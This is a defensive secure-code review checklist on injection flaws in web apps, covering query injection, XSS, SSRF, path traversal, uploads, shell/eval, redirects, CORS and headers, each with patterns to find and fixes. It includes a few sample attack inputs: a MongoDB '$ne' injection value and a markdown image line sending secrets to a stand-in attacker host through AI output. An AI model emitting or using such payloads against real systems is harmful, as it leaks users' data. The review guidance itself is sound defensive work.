# Injection and input

Contents: [INJ-1 queries built from input](#inj-1-queries-built-from-input) · [INJ-2 HTML from users or models](#inj-2-html-from-users-or-models) · [INJ-3 the server fetches any URL](#inj-3-the-server-fetches-any-url) · [INJ-4 paths from input](#inj-4-paths-from-input) · [INJ-5 uploads](#inj-5-uploads) · [INJ-6 shell commands and eval](#inj-6-shell-commands-and-eval) · [INJ-7 open redirects](#inj-7-open-redirects) · [INJ-8 CORS and cross-site requests](#inj-8-cors-and-cross-site-requests) · [INJ-9 security headers](#inj-9-security-headers)

Every check here is the same trace: a source a stranger controls (a form, URL, header, upload, webhook, model output)
reaching a sink that interprets it (a query, the page, a fetch, the file system, a shell). Prove it by quoting each step
of the path, never by sending a payload to a live app.

## INJ-1 Queries built from input

**Applies:** any database query on the server, and Supabase filters built from strings.

**Find:** input inside a query string: template literals or `+` in `query(`, `execute(`, `$queryRawUnsafe(`,
`$executeRawUnsafe(`, `sql.raw(`, `knex.raw(`, `sequelize.query(`; Postgres functions using `execute` with string
concatenation instead of `format('%I', ...)`/`%L` or `using`; Supabase `.or(\`name.ilike.${input}\`)` and other filter
strings built from input, which let a user add their own filters; MongoDB queries taking request objects straight
(`find({ email: req.body.email })`, where the body can send `{"$ne": null}`).

**Fix:** parameters (`$queryRaw` as a tagged template, `query(text, values)`, the ORM's builders), `format()` with `%I`
and `%L` in Postgres functions, validated values in Supabase filters (or `.ilike("name", input)` instead of a filter
string), and type checks that reject objects where a string is expected.

**At stake:** reading or changing the whole database (OWASP A05:2025, Injection).

## INJ-2 HTML from users or models

**Applies:** anything that renders user content or AI output.

**Find:** `dangerouslySetInnerHTML`, `v-html`, `{@html`, `innerHTML =`, `insertAdjacentHTML`, `document.write`;
markdown rendered with raw HTML allowed (`rehype-raw`, `allowDangerousHtml`, `html: true` in markdown-it, `marked`
without a sanitizer); `href` or `src` from user data (a `javascript:` URL runs code); AI output rendered as HTML or as
markdown with images (an injected `![](https://attacker/?q=<secrets>)` leaks data when it loads).

**Fix:** render as text (React does by default); when HTML is needed, sanitize with DOMPurify; render markdown with raw
HTML off; allow only `http:`, `https:` and `mailto:` in links; for AI output, don't load images from domains you don't
control.

**At stake:** stolen sessions and actions taken as the victim. Stored XSS, which every visitor of a page triggers, is
Critical.

## INJ-3 The server fetches any URL

**Applies:** link previews, "import from URL", image proxies, webhook testers, PDF or screenshot renderers, and AI
tools that browse.

**Find:** `fetch(`, `axios(`, `got(`, `request(`, Puppeteer `page.goto(` with a URL from the request or from a model.

**Fix:** allow-list hosts where you can. Otherwise resolve the hostname and refuse private, loopback and link-local
addresses (0.0.0.0/8, 10.0.0.0/8, 100.64.0.0/10, 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.168.0.0/16, ::1,
fc00::/7, fe80::/10, and IPv4-mapped IPv6 such as `::ffff:169.254.169.254`), check the address you connect to rather
than the one you resolved first, refuse redirects to
them, allow only http and https, and cap time and size.

**At stake:** the cloud's metadata endpoint (169.254.169.254) hands out the server's credentials (OWASP A01:2025 now
counts this server-side request forgery as broken access control).

## INJ-4 Paths from input

**Applies:** downloads, file viewers, template loaders and zip extraction.

**Find:** `readFile`, `createReadStream`, `sendFile`, `path.join(dir, input)`, and archive extraction without checking
entry names (`../` in a zip entry writes outside the folder).

**Fix:** look files up by id, never by path; when a path is unavoidable, `path.resolve` it and check it still starts with
the allowed folder.

**At stake:** reading `.env` or source code from the server.

## INJ-5 Uploads

**Applies:** any upload.

**Find:** no size limit; type taken from the file name or the client's `Content-Type`; uploads served from the app's own
domain (an uploaded SVG or HTML file runs scripts there); original file names kept; photos stored with EXIF GPS data.

**Fix:** cap the size; check the type from the file's first bytes; serve uploads from a separate domain or bucket, with
`Content-Disposition: attachment` for anything that isn't an image; rename files to random ids; strip EXIF from photos.

**At stake:** stored XSS through an SVG, users' home locations in their photos, and a storage bill (COST-5).

## INJ-6 Shell commands and eval

**Applies:** servers that call other programs or run code.

**Find:** `exec(`, `execSync(` or `spawn(..., { shell: true })` with input in the string; `eval(`, `new Function(`,
`vm.runIn*` on input or model output; Python `subprocess` with `shell=True`, `os.system`, `pickle.loads`, `yaml.load`
without `SafeLoader`.

**Fix:** `execFile` or `spawn` with an argument array; never eval input or model output; a sandbox for code the app must
run.

**At stake:** the server itself.

## INJ-7 Open redirects

**Applies:** any redirect whose target comes from the request.

**Find:** `redirect(`, `res.redirect(`, `window.location =` or `router.push(` with a query or body value.

**Fix:** accept relative paths that start with `/` and not `//`, or match against a list.

**At stake:** phishing links that start with your domain, and stolen sign-in tokens (references/auth.md, AUTH-4).

## INJ-8 CORS and cross-site requests

**Applies:** APIs called from browsers.

**Find:** `Access-Control-Allow-Origin` reflecting the request's `Origin`, or `*` together with
`Access-Control-Allow-Credentials: true`; cookie-authenticated routes that change data on `GET`, or on `POST` without
`SameSite` cookies or a CSRF token.

**Fix:** a fixed list of origins; state changes only on POST, PUT, PATCH or DELETE; `SameSite=Lax` cookies or CSRF tokens.

**At stake:** another site acting as your signed-in user.

## INJ-9 Security headers

**Applies:** every web app. Low on its own; these limit the damage when something above fails.

**Find:** `curl -sI https://<app>` and the framework config (`next.config.js` `headers()`, `vercel.json`, `netlify.toml`,
`_headers`). Missing: `Content-Security-Policy` (or at least `frame-ancestors`), `Strict-Transport-Security`,
`X-Content-Type-Options: nosniff`, `Referrer-Policy`.

**Fix:** add them in the framework config. Start the CSP in report-only mode when the app loads third-party scripts.

**At stake:** clickjacking, and XSS that a CSP would have stopped.
